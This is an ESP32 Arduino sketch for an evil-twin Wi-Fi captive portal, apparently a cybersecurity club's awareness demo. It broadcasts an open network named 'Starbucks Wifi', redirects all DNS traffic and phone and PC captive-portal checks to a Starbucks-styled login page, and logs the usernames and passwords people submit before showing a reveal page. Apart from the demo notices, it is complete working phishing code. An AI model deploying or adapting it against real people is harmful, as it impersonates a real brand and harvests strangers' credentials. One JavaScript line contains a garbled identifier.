
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

// ==========================================
// 1. WIFI CONFIGURATION
// ==========================================

const char* ssid = "Starbucks Wifi";

const byte DNS_PORT = 53;

IPAddress localIP(192, 168, 4, 1);
IPAddress gateway(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);

// Fixed demonstration credentials
const char* DEMO_USER = "guest";
const char* DEMO_PASS = "demo1234";


// ==========================================
// 2. STARBUCKS-STYLE LOGIN PAGE
// ==========================================

const char LOGIN_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Starbucks Free Wi-Fi</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    padding: 20px;

    font-family: Arial, sans-serif;

    background: #e9eee9;

    display: flex;
    align-items: center;
    justify-content: center;
}

.container {
    width: 100%;
    max-width: 430px;

    padding: 30px 25px;

    background: white;
    border-radius: 14px;

    text-align: center;

    box-shadow: 0 8px 30px rgba(0,0,0,0.12);
}

.logo {
    width: 130px;
    height: 130px;
    margin-bottom: 10px;
}

h1 {
    color: #00704A;
    font-size: 27px;
    margin: 10px 0;
}

.description {
    color: #555;
    font-size: 14px;
    line-height: 1.6;
    margin-bottom: 22px;
}

input[type="text"],
input[type="email"],
input[type="password"] {

    display: block;
    width: 100%;

    margin: 13px 0;
    padding: 13px;

    border: none;
    border-bottom: 2px solid #ccc;

    outline: none;

    font-size: 14px;
}

input:focus {
    border-bottom-color: #00704A;
}

.submit {
    width: 100%;

    margin-top: 18px;
    padding: 14px;

    background: #00704A;
    color: white;

    border: none;
    border-radius: 50px;

    font-size: 16px;
    font-weight: bold;

    cursor: pointer;
}

.small-text {
    font-size: 11px;
    color: #888;
    line-height: 1.5;
}

.demo-notice {
    padding: 10px;
    margin: 15px 0;

    background: #fff4d6;
    border-radius: 7px;

    color: #755b20;
    font-size: 11px;
    line-height: 1.5;
}

a {
    color: #00704A;
}

</style>
</head>

<body>

<div class="container">

    <!-- EMBEDDED LOCAL SVG LOGO -->

    <svg class="logo"
         viewBox="0 0 120 120"
         xmlns="http://www.w3.org/2000/svg">

        <circle cx="60" cy="60" r="56"
                fill="#00704A"/>

        <path d="M37 43 H83 L78 82
                 Q60 94 42 82 Z"
              fill="white"/>

        <path d="M83 49 H91
                 Q105 49 98 68
                 Q94 78 81 77"
              fill="none"
              stroke="white"
              stroke-width="6"/>

        <path d="M44 35 Q48 26 45 19
                 M60 35 Q64 26 61 19
                 M76 35 Q80 26 77 19"
              fill="none"
              stroke="white"
              stroke-width="3"
              stroke-linecap="round"/>

    </svg>

    <h1>Free Wi-Fi</h1>

    <p class="description">
        <strong>Wi-Fi + Coffee = ❤️</strong>
        <br><br>

        Log onto our network once, and enjoy
        complimentary Wi-Fi.
    </p>

    <form action="/capture" method="POST">

        <input
            type="text"
            name="username"
            placeholder="Username"
            required
        >

        <input
            type="password"
            name="password"
            placeholder="Demo password"
            required
        >

        <p class="small-text">
            By accepting, you acknowledge that this
            is an educational cybersecurity simulation.
        </p>

        <input
            type="submit"
            value="Accept & Connect"
            class="submit"
        >

    </form>

    <p class="small-text">
        UCYSS Cybersecurity Club
        <br>
        Educational Evil Twin Simulation
    </p>

</div>

</body>
</html>
)rawliteral";


// ==========================================
// 3. UCYSS REVEAL PAGE
// ==========================================

const char REVEAL_TEMPLATE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>UCYSS Security Demonstration</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #090d16;
      color: #f1f5f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      box-sizing: border-box;
    }
    .container {
      background: #111827;
      border: 1px solid #1f2937;
      border-top: 4px solid #38bdf8;
      padding: 30px;
      border-radius: 16px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 10px 10px -5px rgba(56, 189, 248, 0.1);
    }
    .badge {
      display: inline-block;
      background: rgba(56, 189, 248, 0.1);
      color: #38bdf8;
      border: 1px solid rgba(56, 189, 248, 0.3);
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 16px;
    }
    h2 {
      color: #f8fafc;
      margin-top: 0;
      font-size: 22px;
      font-weight: 800;
      letter-spacing: -0.5px;
    }
    p {
      color: #94a3b8;
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 16px;
    }
    .creds-box {
      background: rgba(239, 68, 68, 0.08);
      border: 1px dashed #ef4444;
      padding: 12px 16px;
      border-radius: 8px;
      margin: 20px 0;
      font-family: monospace;
    }
    .creds-box p {
      color: #fca5a5;
      margin: 4px 0;
      font-size: 13px;
    }
    .footer {
      border-top: 1px solid #1f2937;
      margin-top: 24px;
      padding-top: 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 12px;
      color: #64748b;
    }
    .footer b {
      color: #38bdf8;
      letter-spacing: 0.5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <span class="badge">UCYSS Live Simulation</span>
    <h2>You Just Got Evil Twinned!</h2>
    <p>Relax, your data is safe. You just stepped into an educational cybersecurity demonstration by <span style="color: #38bdf8; font-weight: 600;">UCYSS</span>.</p>
    
    <div class="creds-box">
      <p><b>User:</b> %USER%</p>
      <p><b>Pass:</b> %PASS%</p>
    </div>

    <p>If this were a malicious actor outside, these inputs would already be harvested. Always verify SSL certificates on captive portals before entering credentials.</p>

    <div class="footer">
      <span>To shine is to blind others.</span>
      <b>PIXORA BOOTH</b>
    </div>
    <div class="social-section">

      <p>Follow UCYSS on social media</p>

      <div style="background: #0f172a; border: 1px solid #1e293b; border-radius: 10px; padding: 14px 16px; margin-top: 20px; display: flex; flex-direction: column; gap: 12px;">
      <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; text-align: left;">
          Connect with UCYSS
      </div>

      <!-- Instagram Row -->
      <div style="display: flex; justify-content: space-between; align-items: center; gap: 12px;">
        <div style="text-align: left;">
          <div style="font-size: 11px; color: #64748b;">Instagram</div>
          <div style="font-size: 14px; font-weight: 700; color: #38bdf8;">@ucyss.uptm</div>
        </div>
        <button type="button" onclick="copyText('@ucyss.uptm', this)" style="background: rgba(56, 189, 248, 0.12); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.35); padding: 7px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; white-space: nowrap;">
          Copy Handle
        </button>
      </div>

      <div style="height: 1px; background: #1e293b;"></div>

      <!-- LinkedIn Row -->
      <div style="display: flex; justify-content: space-between; align-items: center; gap: 12px;">
        <div style="text-align: left;">
          <div style="font-size: 11px; color: #64748b;">LinkedIn</div>
          <div style="font-size: 14px; font-weight: 700; color: #38bdf8;">UCYSS UPTM</div>
        </div>
        <button type="button" onclick="copyText('UCYSS UPTM', this)" style="background: rgba(56, 189, 248, 0.12); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.35); padding: 7px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; white-space: nowrap;">
          Copy Name
        </button>
      </div>
    </div>

    <script>
    function copyText(text, btn) {
      if (navi    gator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text);
      } else {
        const temp = document.createElement('textarea');
        temp.value = text;
        document.body.appendChild(temp);
        temp.select();
        document.execCommand('copy');
        document.body.removeChild(temp);
      }

      const original = btn.textContent;
      btn.textContent = 'Copied!';
      btn.style.background = '#38bdf8';
      btn.style.color = '#090d16';
      setTimeout(() => {
        btn.textContent = original;
        btn.style.background = 'rgba(56, 189, 248, 0.12)';
        btn.style.color = '#38bdf8';
      }, 2000);
    }
    </script>

</div>
  </div>
</body>
</html>
)rawliteral";


// ==========================================
// 4. HTTP HANDLERS
// ==========================================

void handleRoot() {

    server.send_P(
        200,
        "text/html",
        LOGIN_PAGE
    );

}


// Demo-only submission.

void handleCapture() {

  String user = server.hasArg("username") ? server.arg("username") : "Unknown";
  String pass = server.hasArg("password") ? server.arg("password") : "N/A";

    Serial.println();
    Serial.println("================================");
    Serial.println("[+] DEMO CREDENTIALS");
    Serial.println("================================");

    Serial.print("Username: ");
    Serial.println(user);

    Serial.print("Password: ");
    Serial.println(pass);

    Serial.println("================================");

    String page = FPSTR(REVEAL_TEMPLATE);
    page.replace("%USER%", user);
    page.replace("%PASS%", pass);

    server.send(
        200,
        "text/html",
        page
    );

}


// ==========================================
// 5. CAPTIVE PORTAL REDIRECTION
// ==========================================

void redirectToPortal() {

    server.sendHeader(
        "Location",
        "http://192.168.4.1/",
        true
    );

    server.send(
        302,
        "text/plain",
        ""
    );

}


// ==========================================
// 6. SETUP
// ==========================================

void setup() {

    Serial.begin(115200);

    delay(1000);

    Serial.println();
    Serial.println("================================");
    Serial.println(" UCYSS EVIL TWIN DEMONSTRATION");
    Serial.println("================================");

    // Configure Wi-Fi AP

    WiFi.mode(WIFI_AP);

    WiFi.setSleep(false);

    WiFi.softAPConfig(
        localIP,
        gateway,
        subnet
    );

    // Start access point

    WiFi.softAP(
        ssid,
        "",
        6,
        false,
        4
    );

    WiFi.setTxPower(WIFI_POWER_19_5dBm);

    // Start DNS wildcard

    dnsServer.start(
        DNS_PORT,
        "*",
        localIP
    );

    // Main portal

    server.on(
        "/",
        HTTP_GET,
        handleRoot
    );

    // Demo form submission

    server.on(
        "/capture",
        HTTP_POST,
        handleCapture
    );

    // Android captive portal detection

    server.on(
        "/generate_204",
        HTTP_GET,
        redirectToPortal
    );

    server.on(
        "/gen_204",
        HTTP_GET,
        redirectToPortal
    );

    // Apple captive portal detection

    server.on(
        "/hotspot-detect.html",
        HTTP_GET,
        redirectToPortal
    );

    // Windows captive portal detection

    server.on(
        "/connecttest.txt",
        HTTP_GET,
        redirectToPortal
    );

    server.on(
        "/ncsi.txt",
        HTTP_GET,
        redirectToPortal
    );

    server.on(
        "/redirect",
        HTTP_GET,
        redirectToPortal
    );

    // Unknown requests

    server.onNotFound(handleRoot);

    // Start web server

    server.begin();

    Serial.println("[+] Access Point Started");

    Serial.print("[+] SSID: ");
    Serial.println(ssid);

    Serial.print("[+] IP Address: ");
    Serial.println(WiFi.softAPIP());

    Serial.println("[+] DNS Server Started");

    Serial.println("[+] Web Server Started");

    Serial.println("[+] Demo Ready");

}


// ==========================================
// 7. MAIN LOOP
// ==========================================

void loop() {

    dnsServer.processNextRequest();

    server.handleClient();

}
